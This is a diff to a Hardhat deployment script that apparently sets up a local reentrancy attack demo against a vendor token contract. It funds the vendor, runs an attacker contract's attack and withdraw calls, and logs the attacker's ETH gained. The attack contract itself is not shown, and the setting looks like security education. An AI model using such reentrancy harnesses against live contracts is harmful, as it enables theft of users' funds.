@@ -3,6 +3,7 @@ import { ethers } from "hardhat";
 import { CampusToken, FHCWVendor } from "../typechain-types";
 import hre from "hardhat";
 import { AddressLike } from "ethers";
+import { float } from "hardhat/internal/core/params/argumentTypes";
 
 async function main() {
 
@@ -35,8 +36,6 @@ async function main() {
 
     await reentrancy.waitForDeployment();
 
-    console.log(`SC01 deployed to ${reentrancy.target} with owner ${await reentrancy.owner()}`);
-
     let tx = await campusToken.grantPrivileges(vendorMachine.target)
     await tx.wait();
 
@@ -58,28 +57,33 @@ async function main() {
     })
     await tx.wait()
 
-    console.log(`Vendor ETH balance: ${BigInt(await provider.getBalance(vendorMachine.target)) / BigInt(10 ** 18)}`)
+    console.log(`Vendor balance: ${BigInt(await provider.getBalance(vendorMachine.target)) / BigInt(10 ** 18)} ETH`)
 
 
     // Logs the attackers ETH balance before the attack
     const b4Attack = await provider.getBalance(addr1)
-    console.log(`Attacker before attack: ${b4Attack}`)
+    console.log(`Attacker before attack: ${b4Attack / BigInt(10 ** 18)} ETH`)
 
     // Executes the reentrancy attack
     try {
         tx = await reentrancy.connect(addr1).attack({value: String(1 * 10 ** 18)})
         await tx.wait();
-    } catch {
-        console.log(`Transaction reverted`)
+    } catch (e) {
+        console.log(`Transaction reverted ${e}`)
     }
+
+    console.log(`Attacker contract balance: ${await provider.getBalance(reentrancy.target)}`)
+
+    tx = await reentrancy.connect(addr1).withdraw();
+    await tx.wait();
 
     // Logs the attackers ETH balance after the attack
     const afterAttack = await provider.getBalance(addr1)
     console.log(`Attacker after attack: ${afterAttack}`)
 
     // Total gained ETH after attack and remaining Tokens
-    console.log(`Attacker lost/gained: ${afterAttack - b4Attack}`)
-    console.log(`FHCWVendor now has ${await vendorMachine.balanceOfVendor() / BigInt(10)} Tokens`);
+    console.log(`Attacker lost/gained: ${Number((afterAttack - b4Attack) / BigInt(10 ** 15)) / 1000.0} ETH`)
+    console.log(`FHCWVendor now has ${await provider.getBalance(vendorMachine) / BigInt(10 ** 18)} ETH`);
 
 }
 
